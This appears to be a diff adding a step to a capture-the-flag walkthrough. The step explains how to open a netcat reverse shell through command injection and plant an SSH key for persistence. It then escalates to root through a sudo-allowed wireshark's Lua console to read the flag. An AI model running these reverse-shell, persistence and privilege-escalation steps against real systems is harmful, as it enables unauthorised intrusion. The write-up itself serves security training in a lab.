@@ -207,7 +207,69 @@ $ cat /home/jeanmi/flag
 
 ### Step 4
 
-> WIP
+Now that you are able to execute commands on the server, you can gain an access with a reverse shell.
+For that execute on your own computer
+``` sh
+$ nc -nlvp 51337
+```
+
+And then execute on the server via the command injection
+
+```sh
+$ nc -e /bin/sh <YOU IP> 51337
+```
+
+Now that you can easily execute any command, gain SSH access by adding your SSH public key in ```/home/jeanmi/.ssh/authorized_keys```
+Then connect to the server with SSH.
+
+
+Once you are connected, you can check jeanmi's sudo right.
+
+```sh
+$ sudo -l
+```
+<img src="screenshots/screenshot_step4_sudo.png" width="700em" style="margin-left: auto; margin-right: auto;">
+
+You can execute wireshark as root. But wireshark is a GUI software so you need X11 forwarding. 
+
+Hopefully, it seems up on the server.
+
+<img src="screenshots/screenshot_step4_X11.png" width="700em" style="margin-left: auto; margin-right: auto;">
+
+So, you can connect via SSH to the server with X11Forwarding
+
+```sh
+ssh -Y jeanmi@<SERVER IP>
+```
+
+Now you can execute wireshark as root.
+
+```sh
+sudo /usr/bin/wireshark
+```
+
+Once wireshark opened, by clicking on _Tools_ > _Lua_ > _Evaluate_ you'll be able to execute LUA.
+
+<img src="screenshots/screenshot_step4_wireshark.png" width="700em" style="margin-left: auto; margin-right: auto;">
+
+In the console you can write LUA code. The output will be on the shell where you launched wireshark.
+
+```lua
+os.execute("id")
+```
+
+<img src="screenshots/screenshot_step4_lua_id.png" width="700em" style="margin-left: auto; margin-right: auto;">
+
+So you can print the flag.
+
+```lua
+os.execute("cat /root/flag")
+```
+
+<img src="screenshots/screenshot_step4_flag.png" width="700em" style="margin-left: auto; margin-right: auto;">
+
+
+
 
 ## License
 
